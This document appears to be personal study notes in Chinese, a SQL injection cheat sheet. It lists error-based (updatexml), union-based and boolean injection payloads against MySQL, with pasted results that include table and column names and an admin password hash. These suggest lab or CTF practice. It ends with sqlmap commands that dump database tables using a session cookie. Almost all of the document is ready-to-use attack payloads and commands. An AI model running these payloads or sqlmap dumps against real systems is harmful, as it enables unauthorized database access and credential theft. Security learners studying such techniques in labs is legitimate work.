# SQL注入

## 报错注入

报错数据库名 

- select updatexml(1,concat(0x7e,database()),1); 

' or updatexml(1,concat(0x7e,database()),1);# 

abc 

 

报错数据库表 

- select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1); 

' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1);# 

admin 

 

如果数据库中的表（table）只有一个 

- select updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1); 

' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1);# 

 

报错数据库表中的列 

- select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=**'****table name****'**)),1); 

'or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=**'****admin****'**)),1);# 

username password 

 

'or updatexml(1,substr(concat(0x7e,(select concat(username,',',password) from abc.admin)),4,32),1);# 

21232f297a57a5a743894a0e4a8 

Love_is_a_light_that_never_dims 



报错数据库中的数据 

- select updatexml(1,concat(0x7e,(select concat(**id**,',',**username**,',',**password**) from **login.user** limit 0,1)),1); 

'or updatexml(1,substr(concat(0x7e,(select concat(**username**,',',**password**) from **abc.admin** limit 1,1)),4,32),1);# 

查看从0开始第1个数据 

 

报出多个数据 

- select updatexml(1,concat(0x7e,(select group_concat(**id,',',username,',',password**) from **login.user** limit 0,2)),1); 

'or updatexml(1,concat(0x7e,(select group_concat(**id,',',username,',',password**) from **login.user** limit 0,2)),1);# 

用group_concat输出多个数据 

## 联合注入

?id=1 order by **n** 

 

?id=-1 union select 1,2,3,4,5,6,7, 

database() 

,9,10 

 

xycms 

 

?id=-1 union select 1,2,3,4,5,6,7, 

group_concat(table_name) 

,9,10 from information_schema.tables where table_schema=database() 

 

common,config,down_fl,gbook,manage_user,menu,news,news_fl,pro_fl,xy_case,xy_download,xy_pro,xy_zp 

 

?id=-1 union select 1,2,3,4,5,6,7, 

group_concat(column_name) 

,9,10 from information_schema.columns where table_schema=database() and table_name='**manage_user**' 

 

id,m_name,m_pwd,c_date 

 

?id=-1 union select 1,2,3,4,5,6,7, 

group_concat(**m_name,0x7e,m_pwd**) 

,9,10 from **manage_user** limit 0,1 

 

admin~21232f297a57a5a743894a0e4a801fc3 

 ## 布尔注入

' or ascii(substr(database(),1,1)) > 105# 

判断 



# sqlmap指令

1. 扫描数据库名，用于获取数据库的名称

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" --current-db
   ```

2. 扫描本数据库的表

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> --tables
   ```

3. 扫描数据库表的列

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> -T <table> --columns
   ```

4. 获取数据库表中列的信息

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> -T <table> -C <column1>,<column2>,... --dump
   ```

   